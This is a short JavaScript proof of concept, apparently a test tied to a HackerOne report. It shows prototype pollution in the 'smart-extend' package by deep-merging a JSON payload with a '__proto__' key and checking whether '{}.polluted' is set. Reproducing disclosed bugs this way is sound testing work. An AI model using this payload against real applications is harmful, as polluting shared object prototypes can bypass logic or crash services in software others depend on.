// //https://hackerone.com/reports/438274

// test("prototype pollution in smart-extend", () => {
  var extend = require("smart-extend");
  obj = {};

console.log({}.polluted);
  var payload = '{"__proto__":{"polluted":"yes"}}';

  extend.deep({}, JSON.parse(payload));
console.log({}.polluted);
// });
